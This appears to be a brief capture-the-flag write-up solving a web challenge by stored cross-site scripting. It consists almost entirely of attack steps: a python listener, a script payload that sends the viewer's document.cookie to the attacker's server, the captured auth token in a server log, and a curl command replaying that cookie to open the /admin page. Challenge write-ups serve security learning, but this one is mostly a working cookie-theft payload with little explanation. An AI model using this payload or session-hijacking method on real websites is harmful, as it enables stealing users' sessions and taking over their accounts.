Start a python server to capture the credentials...
`python3 -m http.server`

Then submit a story:
`<script>fetch("http://10.0.0.0:8000/" + document.cookie)</script>`

There will then be a request after a minute or so...

`127.0.0.1 - - [02/Aug/2021 23:39:07] "GET /auth=6b2a3d6dda4d0b27bbb82b8503339441 HTTP/1.1" 404 -`

We can then set this cookie on our browser, navigate to /admin and get the page.

`curl http://challengeurl/admin -H 'Cookie: 'auth=6b2a3d6dda4d0b27bbb82b8503339441'`
